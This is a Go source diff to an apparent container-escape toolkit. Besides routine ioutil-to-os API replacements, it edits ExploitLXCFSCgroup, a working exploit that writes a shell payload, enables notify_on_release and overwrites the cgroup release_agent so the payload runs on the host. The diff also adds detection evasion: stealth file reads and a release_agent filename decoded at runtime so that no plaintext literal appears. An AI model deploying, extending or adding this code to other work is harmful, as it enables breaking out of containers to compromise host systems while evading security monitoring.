@@ -21,7 +21,6 @@ package escaping
 
 import (
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"path"
@@ -78,7 +77,7 @@ func IsDir(path string) bool {
 
 // FindDir will return the first dir's absolute path in the given path
 func FindDir(path string) string {
-	files, _ := ioutil.ReadDir(path)
+	files, _ := os.ReadDir(path)
 	for _, f := range files {
 		if IsDir(f.Name()) {
 			return path + "/" + f.Name()
@@ -133,7 +132,7 @@ func ExploitLXCFSCgroup() bool {
 	fmt.Printf("final shell payload is: \n\n")
 	fmt.Println(expShellText)
 
-	err = ioutil.WriteFile(outFile, []byte(expShellText), 0777)
+	err = os.WriteFile(outFile, []byte(expShellText), 0777)
 	if err != nil {
 		log.Printf("write shell payload failed\n")
 		return false
@@ -156,24 +155,24 @@ func ExploitLXCFSCgroup() bool {
 	defer func() { _ = os.RemoveAll(targetDir + subgroupName) }()
 
 	// enable notify_on_release
-	err = ioutil.WriteFile(targetDir+subgroupName+"/notify_on_release", []byte("1"), 0644)
+	err = os.WriteFile(targetDir+subgroupName+"/notify_on_release", []byte("1"), 0644)
 	if err != nil {
 		log.Printf("cannot enable notify_on_release %s", err)
 		return false
 	}
 	// write release_agent (filename decoded at runtime; no plaintext literal)
 	releaseAgentFile := releaseAgentPath + util.CgroupReleaseAgentFile()
-	previousReleaseAgent, restoreReleaseAgent := ioutil.ReadFile(releaseAgentFile)
-	err = ioutil.WriteFile(releaseAgentFile, []byte(hostPath+outFile), 0644)
+	previousReleaseAgent, restoreReleaseAgent := util.StealthReadFile(releaseAgentFile)
+	err = os.WriteFile(releaseAgentFile, []byte(hostPath+outFile), 0644)
 	if err != nil {
 		log.Printf("cgroup release control file is not writable %s", err)
 		return false
 	}
 	defer func() {
 		if restoreReleaseAgent == nil {
-			_ = ioutil.WriteFile(releaseAgentFile, previousReleaseAgent, 0644)
+			_ = os.WriteFile(releaseAgentFile, previousReleaseAgent, 0644)
 		} else {
-			_ = ioutil.WriteFile(releaseAgentFile, []byte{}, 0644)
+			_ = os.WriteFile(releaseAgentFile, []byte{}, 0644)
 		}
 	}()
 
@@ -190,7 +189,7 @@ func ExploitLXCFSCgroup() bool {
 		return false
 	}
 	// write PID to cgroup.procs
-	err = ioutil.WriteFile(targetDir+subgroupName+"/cgroup.procs", []byte(strconv.Itoa(triggerProc.Pid)), 0644)
+	err = os.WriteFile(targetDir+subgroupName+"/cgroup.procs", []byte(strconv.Itoa(triggerProc.Pid)), 0644)
 	if err != nil {
 		log.Printf("Write PID to cgroup.procs failed: %s \n", err.Error())
 		return false
@@ -208,7 +207,7 @@ func ExploitLXCFSCgroup() bool {
 		// upperdir (hostPath+outputFile), which surfaces back through the
 		// container's own /. Do NOT prefix hostPath — that host path is not
 		// visible from inside the container.
-		retRes, err = ioutil.ReadFile(resultFile)
+		retRes, err = util.StealthReadFile(resultFile)
 		if err == nil {
 			break
 		}
